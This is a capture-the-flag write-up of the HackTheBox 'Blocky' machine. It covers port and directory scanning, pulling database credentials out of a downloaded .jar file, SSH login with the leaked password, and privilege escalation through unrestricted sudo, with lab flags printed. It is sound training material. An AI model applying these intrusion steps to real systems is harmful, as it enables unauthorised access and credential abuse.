## Enumeration  


### Port Scanning  

Running our portscan with NMap comes back kind of juicy. We notice an outdated FTP server on port 21, OpenSSH on port 22, an Apache webserver on port 80, and a minecraft server on port 25565.  


```bash
sudo nmap -sS -T5 -A -sV -p- 10.10.10.37 | tee nmap_full.log

PORT      STATE  SERVICE   VERSION
21/tcp    open   ftp       ProFTPD 1.3.5a
22/tcp    open   ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)

```  

### Directory Scanning  

After discovering port 80 open, I launched a directory buster against blocky.htb which returned quite a few results:  

```bash
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://blocky.htb/FUZZ | tee ffuf.log

wiki                    [Status: 301, Size: 307, Words: 20, Lines: 10, Duration: 96ms]
wp-content              [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 96ms]

server-status           [Status: 403, Size: 298, Words: 22, Lines: 12, Duration: 96ms]
```  

### WPScan  

Since we detected WordPress running on this webserver (wp-content and wp-includes in the directory scan indicate this), I ran wpscan:  

```bash
wpscan http://blocky.htb/
```  

This returned some information about plugins, themes and the wordpress version, but I did not use it to exploit this machine.  

### Manual Web Browser Inspection  

Navigating to 10.10.10.37:80 in our browser attempts to redirect to http://blocky.htb and fails. This means we need to add a new line to our /etc/hosts file.  

Add a line to the file that looks like this and save it:  

```bash
10.10.10.37    blocky.htb
```  

Now, when we refresh the page, we are presented with a blog-style Wordpress site and a Minecraft background:  

![Home](/assets/images/HTB/blocky/home.png)  

There is a broken comment section and a login portal, however, the only thing I really noted was that there is a comment from a developer named Notch on this page:  

![Notch](/assets/images/HTB/blocky/notch.png)  

Continuing with enumeration, I was quickly drawn to a web directory named /plugins/files/ which hosted two .jar files, which are executable Java file formats (one of them is named BlockyCore... wink wink machine name).  

![files](/assets/images/HTB/blocky/files.png)  

These seem suspiciously placed, and I downloaded them to inspect.  

After clicking these to download, I ran the following command to inflate them (as they are zipped) and view the contents:  

```bash
jar xvf ~/Downloads/BlockyCore.jar

jar xvf ~/Downloads/griefprevention-1.11.2-3.1.1.298.jar
```  

Navigating into their created folders, I find a suspicious file and run the *strings* command on it to print out any strings in the file.  

```bash
cd ~/Downloads/

ls

BlockyCore.jar  com  griefprevention-1.11.2-3.1.1.298.jar  mcmod.info  me  META-INF
```  

![Reading Jar Files](/assets/images/HTB/blocky/jar.png)  

We see information here for a SQL user login and what looks to be credentials... boom!  

## Exploitation  

### phpMyAdmin  

Initially my first thought was to go login to the phpMyAdmin portal that we enumerated earlier, and I did, as root user with the above credentials.  

Enumerating this database, we can see a user named Notch, again. But all of this was honestly extra work compared to the minimum you need to enumerate the next step.  

### FTP  

I ALSO logged into notch over FTP on port 21, and rooted around for a minute but this too, was unnecessary. Lastly, I logged into the computer remotely over SSH:  

```bash
ssh notch@10.10.10.37

The authenticity of host '10.10.10.37 (10.10.10.37)' can't be established.
ED25519 key fingerprint is SHA256:ZspC3hwRDEmd09Mn/ZlgKwCv8I8KDhl9Rt2Us0fZ0/8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.37' (ED25519) to the list of known hosts.
notch@10.10.10.37's password: 8YsqfCTnvxAUeduzjNSXe22

To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

notch@Blocky:~$ whoami
notch
```  

Let's grab our user flag to satisfy HackTheBox!  

```bash
notch@Blocky:/home$ cd ~
notch@Blocky:~$ ls
minecraft  user.txt

notch@Blocky:~$ cat user.txt
422ba7d0c21bda0d538faca24985e41f
```  
 

## Post-Exploit Enumeration  

The first thing I always check for when logging in as a low-privileged user is suid assigned sudo commands.  

```bash
notch@Blocky:/home$ sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```  

This literally tells us that blocky can run all commands on this machine as the root user... too easy.  


## Privilege Escalation  

The escalation is as simple as running a bash shell with sudo. Let's grab our root flag.  

```bash
notch@Blocky:/home$ sudo /bin/bash
root@Blocky:/home# id
uid=0(root) gid=0(root) groups=0(root)

root@Blocky:/home# whoami
root

root@Blocky:/home# cat /root/root.txt
e52044f3d1312f80daaadab97193f930
```  

That's all for now, thanks for reading!
